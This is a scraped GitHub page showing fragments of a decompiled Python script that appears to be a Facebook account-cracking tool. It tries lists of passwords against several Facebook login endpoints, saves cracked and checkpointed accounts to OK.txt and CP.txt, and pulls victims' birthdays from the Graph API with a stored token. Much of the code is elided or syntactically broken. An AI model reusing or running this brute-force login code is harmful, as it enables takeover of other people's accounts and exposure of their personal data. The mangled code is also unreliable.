...
Security
Insights
DECOMPILED-XD/FUCK-AKING.py
@SHANKAR-XD
SHANKAR-XD Add files via upload
 1 contributor
541 lines (527 sloc)  25.7 KB
try:
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		                           ...
		                           ('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				             ('\r\033[1;92m[Successful-AXB] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					pass
				                    ('\r\033[1;91m[Checkpoint-AXB] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				                    AXB('\r\033[1;32m[Successful-AXB] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].AXB('\r\033[1;91m[Checkpoint-AXB] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				                          ('\r\033[1;92m[Successful-AXB] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = ('token.txt').read()
					cp_ttl = Prof_Aking('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					                  AXB('\r\033[1;91m[Checkpoint-AXB] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				               AXB('\r\033[1;91m[Checkpoint-AXB] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
...
def dupcutter():
	os.system("xdg-open https://wa.me/+92165456679")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
